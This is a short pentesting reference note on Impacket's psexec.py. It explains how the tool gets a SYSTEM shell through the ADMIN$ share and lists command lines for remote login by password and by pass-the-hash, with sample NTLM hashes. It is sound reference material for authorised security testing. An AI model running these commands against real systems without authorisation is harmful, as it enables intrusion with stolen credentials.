---
title:  PsExec - a module from Impacket
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - smb
---
# Impacket PsExec

The [PSExec service](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) then creates a [named pipe](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) that can send commands to the system. Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. It then registers the service via `RPC` and the `Windows Service Control Manager`. Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.

## Installation 

Donwload from: [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) -

## Basic commands


```shell-session
# Get help 
impacket-psexec -h

# Connect to a remote machine with a local administrator account
impacket-psexec administrator:'<password>'@$ip

# Connect to a remote machine with a local administrator account
psexec.py $domain/$user:$password@$ip 

# Connect to a machine passing the hash
impacket-psexec $domain/$user@$ip -hashes $LM-authentication:$NTLM
# Example:
# impacket-psexec egotistical-bank.local/administrator@$ip -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e

# If we only have the NTLM, then we can leave the $LM part in blank. Example:
impacket-psexec Administrator@$ip -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```